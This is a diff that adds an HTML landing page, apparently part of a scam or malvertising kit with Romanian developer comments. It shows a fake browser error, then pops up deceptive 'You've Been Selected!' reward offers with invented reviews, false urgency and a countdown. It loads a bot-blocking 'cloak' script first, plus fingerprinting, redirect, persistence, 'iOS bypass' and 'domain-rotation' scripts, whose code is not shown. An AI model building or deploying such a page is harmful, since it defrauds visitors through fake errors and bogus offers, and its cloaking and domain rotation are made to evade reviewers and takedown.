@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <meta name="robots" content="noindex, nofollow" />
+  <meta name="theme-color" content="#f5f5f5" />
+  <title>Something went wrong</title>
+
+  <!-- Blochează indexare și preload -->
+  <link rel="preconnect" href="/" />
+  <link rel="stylesheet" href="/css/lander.css" />
+
+  <!-- Config global (editat de operator) -->
+  <script src="/config/config.js"></script>
+
+  <!-- Cloak: primul script care rulează, blochează boți imediat -->
+  <script src="/js/cloak.js"></script>
+</head>
+<body>
+
+  <!-- LANDER ERROR PAGE -->
+  <div id="lander-wrap" role="main" aria-label="Error page">
+    <div class="error-icon" aria-hidden="true">
+      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="12" cy="12" r="10"/>
+        <line x1="12" y1="8" x2="12" y2="12"/>
+        <line x1="12" y1="16" x2="12.01" y2="16"/>
+      </svg>
+    </div>
+    <h1 class="error-title">Something Went Wrong</h1>
+    <p class="error-sub">We couldn't load this page. Please go back and try again.</p>
+    <span class="error-code">ERR_CONTENT_DECODING_FAILED</span>
+  </div>
+
+  <!-- POPUP OVERLAY (bottom sheet) -->
+  <div id="popup-overlay" role="dialog" aria-modal="true" aria-label="Exclusive offer" aria-hidden="true">
+    <div id="popup-card">
+      <div class="popup-pill" aria-hidden="true"></div>
+      <div class="popup-badge" aria-label="Limited offer">🔥 Limited Offer</div>
+      <h2 class="popup-title">You've Been Selected!</h2>
+      <p class="popup-sub">
+        Claim your exclusive reward before it expires. Only a few spots left today.
+      </p>
+      <a id="popup-cta-btn"
+         class="popup-cta"
+         href="#"
+         role="button"
+         aria-label="Claim your reward now">
+        Start Now →
+      </a>
+      <p class="popup-disclaimer">Free to join · No credit card required</p>
+      <p class="popup-countdown" id="popup-countdown" aria-live="polite"></p>
+    </div>
+  </div>
+
+  <!-- POPUP FULLSCREEN (alternativă, folosit pe unele variante) -->
+  <div id="popup-fullscreen" role="dialog" aria-modal="true" aria-label="Exclusive offer" aria-hidden="true">
+    <div class="fs-logo" aria-hidden="true">
+      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/>
+      </svg>
+    </div>
+    <h2 class="fs-title">You Qualified for a Special Reward</h2>
+    <p class="fs-sub">
+      Your profile matches our active offer. Claim it before it expires — spots are filling fast.
+    </p>
+    <a id="fs-cta-btn"
+       class="fs-cta"
+       href="#"
+       role="button"
+       aria-label="Start now">
+      Start Now →
+    </a>
+    <div class="fs-stars" aria-label="4.9 stars rating">
+      <span>⭐</span><span>⭐</span><span>⭐</span><span>⭐</span><span>⭐</span>
+    </div>
+    <p class="fs-reviews">4.9 · 12,847 reviews</p>
+  </div>
+
+  <!-- SCRIPTS: ordine importantă -->
+  <script src="/js/fingerprint.js"></script>
+  <script src="/js/uid.js"></script>
+  <script src="/js/params.js"></script>
+  <script src="/js/geo.js"></script>
+  <script src="/js/frequency.js"></script>
+  <script src="/js/ab.js"></script>
+  <script src="/js/redirect.js"></script>
+  <script src="/js/analytics.js"></script>
+  <script src="/js/timer.js"></script>
+  <script src="/js/popup.js"></script>
+
+  <!-- Upgrade v2: persistence, iOS bypass, domain rotation -->
+  <script src="/js/persistence.js"></script>
+  <script src="/js/ios-popup.js"></script>
+  <script src="/js/domain-rotation.js"></script>
+
+  <!-- Orchestrator: ultimul script -->
+  <script src="/js/lander.js"></script>
+
+</body>
+</html>
